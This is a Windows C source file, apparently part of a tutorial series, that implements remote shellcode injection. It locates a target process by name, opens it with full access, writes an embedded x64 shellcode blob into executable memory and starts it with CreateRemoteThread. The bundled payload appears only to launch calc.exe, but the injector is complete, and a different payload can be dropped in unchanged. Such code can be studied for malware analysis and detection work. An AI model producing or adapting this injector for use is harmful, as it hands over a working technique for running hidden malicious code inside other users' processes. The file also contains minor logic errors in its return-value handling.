// The last version of shellcode injection took in a pid as a cmdline arg. However, that means you need to know the PID. It would be much easier if we could just give a process name
// In this code we will do exactly that. We will put both the injection and the finding of a pid into their own fucntions

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// We will define variable for the payload as a global variable so that all our methods can access it
unsigned char payload[] = {
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};
size_t payload_len = sizeof(payload);

// We will first begin with the injection method since we already understand how it works
int Inject (HANDLE hProc, unsigned char * payload, unsigned int payload_len){

    // we begin by defining some variables
    LPVOID pBaseAddress = NULL;
    HANDLE hThread = NULL;

    // Just like before, we will use VirtualAllocEx to allocate memory. This returns the base address of the alocated memory if successful
    // Note that since our handle to the process is all access, we will be able to write to the memory regardless of the protections that are enabled. As such, we can make our memory regeion execute, read from the start
    pBaseAddress = VirtualAllocEx(
        hProc,
        NULL,
        payload_len,
        MEM_COMMIT,
        PAGE_EXECUTE_READ
    );

    if(pBaseAddress == NULL){
        printf("\n(-) Failed to allocate memory, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n(+) Allocated memory, Base Address: %p", pBaseAddress);

    if(!WriteProcessMemory(hProc, pBaseAddress, payload, payload_len, NULL)){
        printf("\n(-) Failed to copy shellcode, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n(+) Copied shellcode");

    // PDWORD oldProtect;
    // if (!VirtualProtectEx(hProc, pBaseAddress, payload_len, PAGE_EXECUTE_READ, oldProtect)){
    //     printf("(-) Failed to change memory protection, error: %ld", GetLastError());
    //     return EXIT_FAILURE;
    // }

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pBaseAddress, NULL, 0, NULL);

    if(hThread == NULL){
        printf("\n(-) Failed to create thread, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n(+) Created Thread and executed");
    WaitForSingleObject(hThread, INFINITE);

    printf("\n(+) Shellcode Executed");
    printf("\n(+) Cleaning Up");
    CloseHandle(hThread);

    return EXIT_SUCCESS;
}

// Now we work on finding the PID
int FindTarget(const char* procname){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    // We will use the process help snapshot tool to take a snapshot of all runnig processes
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // When successful, this API will return the handle to the snapshot. So, if the returned value is not a valid handle, we failed and can return
    if (hProcSnap == INVALID_HANDLE_VALUE){
        printf("\n(-) Failed to take snapshot, error: %ld", GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Process32first outputs info about the first process in a tool help snapshot
    // Returns true if the first entry has been copied to the buffer and false otherwise. Because of this,we can check its return value to see if we encountered an error or not
    // It takes in a handle to the snapshot, and a pointer to a PROCESSENTRY32 struct
    if(!Process32First(hProcSnap, &pe32)){

        printf("(-) Failed to parse snapshot, error: %ld", GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }
    
    while(Process32Next(hProcSnap, &pe32)){
        // In VS Code you may get an error on pe32 telling you its not compatible. This is a nonfatal error and you can ignore it
        if (strcmp(pe32.szExeFile, procname) == 0){
            pid = pe32.th32ProcessID;
            break;            
        }       
    }
    CloseHandle(hProcSnap);
    return pid;
}

// Finally, we can build the main method
int main(int argc, char *argv[]){

    if(argc < 2){
        printf("\n(-) Usage: %s <Process Name>\n", argv[0]);
        return EXIT_FAILURE;
    }

    printf("\nStarting Injection\n");
    int pid = 0;
    HANDLE hProc = NULL;
    const char *procname = argv[1];

    pid = FindTarget(procname);

    if(pid == EXIT_FAILURE || pid == 0){
        printf("\n(-) Could not find target");
        
        if(pid == EXIT_FAILURE){
            printf("(-) Process not found. Are you sure the target process is running?");
        }
        return EXIT_FAILURE;
    }

    // if the pid is not 0 or null
    if(pid){
        printf("\n(+) %s PID = %d", procname, pid);

        // try to get a handle to the process
        hProc = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            (DWORD)pid
        );

        if(hProc != NULL){
            if(Inject(hProc, payload, payload_len) == 0){
                CloseHandle(hProc);
                return EXIT_FAILURE;
            }
            CloseHandle(hProc);            
        }
    }

    return EXIT_SUCCESS;
}